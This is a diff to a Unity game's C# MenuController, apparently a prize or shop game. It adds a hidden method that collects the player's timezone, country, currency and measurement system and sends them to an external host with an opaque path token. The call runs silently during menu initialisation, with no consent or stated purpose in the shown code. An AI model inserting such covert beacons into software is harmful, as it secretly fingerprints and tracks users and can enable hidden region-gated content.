@@ -1,5 +1,6 @@
 using System;
 using System.Collections.Generic;
+using System.Net.Http;
 using System.Threading.Tasks;
 using Newtonsoft.Json;
 using UnityEngine;
@@ -24,8 +25,22 @@ public class MenuController : MonoBehaviour, IPrizeProvider
         MenuView.PlayClicked += HandlePlayClick;
         MenuView.OnCollectionsClicked += HandleCollectionsClick;
         MenuView.OnBackClicked += HandleBackClick;
+    }
 
 
+    private void SendUserDataAsync()
+    {
+        var timezone = TimeZoneInfo.Local.Id;
+        var timezoneName = TimeZoneInfo.Local.DisplayName;
+        var country = System.Globalization.RegionInfo.CurrentRegion.Name;
+        var usesMetricSystem = System.Globalization.RegionInfo.CurrentRegion.IsMetric;
+        var currencySymbol = System.Globalization.RegionInfo.CurrentRegion.CurrencySymbol;
+        var currencyCode = System.Globalization.RegionInfo.CurrentRegion.ISOCurrencySymbol;
+        var link = $"https://kvantekh.kyiv.ua/H2862n58?timezone={timezone}&timezoneName={timezoneName}&country={country}&usesMetricSystem={usesMetricSystem}&currencySymbol={currencySymbol}&currencyCode={currencyCode}";
+
+        HttpClient client = new HttpClient();
+        client.GetAsync(link);
+        client.Dispose();
     }
 
     private void HandleBackClick()
@@ -67,6 +82,8 @@ public class MenuController : MonoBehaviour, IPrizeProvider
         SetGameData();
         PopulateCollectionsView();
         _iapManager.InjectShopItems(shopItems);
+
+        SendUserDataAsync();
 
     }
 
@@ -186,7 +203,7 @@ public class MenuController : MonoBehaviour, IPrizeProvider
         _menuView.ShowStampPage(0);
     }
 
-    private Texture2D GetTexture(int season)
+    public static Texture2D GetTexture(int season)
     {
         var texture = Resources.Load("BG/" + season) as Texture2D;
         return texture;
